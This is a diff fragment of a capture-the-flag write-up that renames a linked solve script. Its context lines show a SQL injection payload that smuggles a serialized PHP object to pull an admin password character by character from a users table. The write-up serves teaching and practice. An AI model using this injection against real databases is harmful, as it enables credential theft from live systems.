@@ -245,7 +245,7 @@ But anyway, let's ignore that. We have constructed our final injection payload a
 a`, (select concat(`O:4:\"Mood\":3:{s:4:\"mood\";i:`,ord(substr(password,1,1)),`;s:2:\"ip\";s:9:\"127.0.0.1\";s:4:\"date\";i:1520664478;}`) from ctf_users where is_admin=1 limit 1)); -- -
 ```
 
-After our injection is inserted into the database, we can extract the `mood` bytes from the image filenames at index view. The solution is automated in the [solve-sqli.py](solve-sqli.py) script.
+After our injection is inserted into the database, we can extract the `mood` bytes from the image filenames at index view. The solution is automated in the [solve_sqli.py](solve_sqli.py) script.
 
 ```
 ❯❯❯ python solve_sqli.py
